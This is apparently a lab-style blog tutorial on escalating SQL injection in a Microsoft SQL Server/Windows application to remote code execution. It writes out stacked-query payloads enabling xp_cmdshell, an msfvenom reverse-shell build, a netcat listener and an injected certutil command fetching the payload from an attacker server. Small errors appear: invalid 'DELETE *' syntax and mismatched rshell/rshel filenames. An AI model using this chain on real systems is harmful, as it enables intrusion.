---
layout: post
title: From SQLi to remote code execution
---

SQL injection opens the way to data manipulation and theft, but I recently discovered that it can be an attack vector enabling **remote code execution** (RCE). This highly critical vulnerability gives the attacker access to the entire target machine.

There are more variants of how to escalate the attack in different Database Management Systems (DBMS) and platforms. For this article, I'll show how an attacker might do it in an application having Microsoft SQL Server as DBMS and running on a Windows machine.

### SQLi
SQL injection (SQLi) is a common web security vulnerability. It allows an attacker to tamper with the SQL statement an application makes to the database.    
SQLi was frequently included in the [OWASP Top 10](https://www.owasptopten.org/).

As a quick refresher on SQLi, I will illustrate a marketplace built with PHP that allows users to delete one of their products. The client will send a `DELETE /products/PROD_ID` request. Server-side, a `$productId` variable is initialized with the value of the `PROD_ID` parameter. It will send this query to the DB:  

```sql
DELETE * FROM products WHERE id = '$productId'; 
```

A malicious user can send this parameter `' OR 1=1--`. If the server does not sanitize and validate the input, it results in the following query. This triggers the deletion of all products:

```sql
DELETE * FROM products WHERE id = '' OR 1=1--';
```

### Store procedures
These are SQL statements that can be reused, think of them as functions in SQL. Many DBMS offer their own stored procedures, Microsoft SQL Server has **xp_cmdshell**.

xp_cmdshell provides a way for the SQL Server to directly execute OS commands and programs. As you can already see, this might pose a security risk.    
For good reasons, this functionality is by default disabled on the production server. But due to specific requirements or just plain misconfigurations, you can sometimes find it enabled.   
In some cases, xp_cmdshell can be enabled manually via `EXEC` queries if the user has one of these attributes:
- *sysadmin* server role
- `ALTER SETTINGS` server-level permission

An attacker might enable it by using [batched (or stacked) queries](https://portswigger.net/web-security/sql-injection/cheat-sheet) and injecting the following configuration options:

```
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
```

From the [documentation](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver16<):

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

## Escalating to RCE
Now that the attacker has detected a SQLi vulnerability and can access xp_cmdshell, the following steps are:
1. Create a malicious payload (a file **rshell.exe**) with **MSFVenom**
2. Serve this file
3. Set up a listener for incoming connections from the target machine
4. On the target machine, use the **certutil.exe** Windows program to download this file from our controlled server
5. Execute the **rshell.exe** file on the target machine to create a reverse shell connection back to the listener on our machine.

> [certutil.exe](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil) is a native Windows CLI program part of Certificate Services. It is signed by Microsoft and used to make HTTP/s connections.
>
> [MSFVenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) is a CLI payload generation tool, and it comes with plenty of utilities used in pen testing and ethical hacking. 

### First step
On my machine, I will use MSFVenom to create our payload (change `MY_LISTENER_IP_ADDR` to your own).

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=MY_LISTENER_IP_ADDR LPORT=3333 -f exe -o rshell.exe
```

A new file called **rshell.exe** has been created.

### Second step
Still on my machine, I will start a Python server, in order to server this file:

```shell
python3 -m http.server 8000
```

All files in my current directory are now accessible to download on the target machine.   

### Third step
I set up a listener using the **Netcat** utility, listening for connections from the target machine on port 3333:

```shell
nc -lnvp 3333
```

### Forth and final step
Using the SQLi vector, I can run the **xp_cmdshell** utility to download and execute this file:

```
'; EXEC xp_cmdshell 'certutil -urlcache -f http://MY_SERVER_IP_ADDR:8000/rshel.exe C:\Windows\Temp\rshel.exe'; --
```

I checked my Python server's output:

```shell
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
MACHINE_IP - - [01/Jan/2024 10:15:01] "GET /rshel.exe HTTP/1.1" 200 -
```

Suggesting that the target machine fetched my file.    
Now, if everything goes well, my Netcat listener should have a reverse shell connection:

```
nc -lnvp 3333
listening on [any] 3333 ...
connect to [99.99.99.99] from (UNKNOWN) [MACHINE_IP] 49730
Microsoft Windows [Version 10.0.13143.1731]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt service\mssql$sqlexpress
```

And great success!   
I have obtained RCE, allowing me to run commands on the target machine. I already ran the `whoami` command and got `nt service\mssql$sqlexpress` as a response.

Doing this exercise was fun as it ties the two common vulnerabilities. As SQL injection can escalate to RCE, it vastly increases the attack surface.   
This highlights how dangerous SQLi vulnerabilities are and the importance of patching them.

## Resources
- tryhackme.com
- www.w3schools.com
- portswigger.net
